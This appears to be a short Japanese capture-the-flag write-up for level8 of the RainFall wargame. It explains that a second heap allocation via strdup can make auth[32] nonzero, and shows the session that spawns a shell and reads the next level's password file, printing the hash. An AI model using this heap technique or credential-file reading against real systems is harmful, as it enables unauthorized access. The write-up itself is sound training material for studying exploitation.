# level8
## 方針
auth[32] != 0 であればshが起動する。
authはstrlen(buffer) < 31で30byteまでしか入れれない。
service = strdup(buffer); strdupは内部でmallocを呼んでるからこれを利用する。

### ans
authでポインタを確保し、serviceでauth[32] != 0 になるように適当に文字列を入れる。その後loginする。

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth a
0x804a008, (nil)
service BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
0x804a008, 0x804a018
login
$ pwd
/home/user/level8
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
## memo
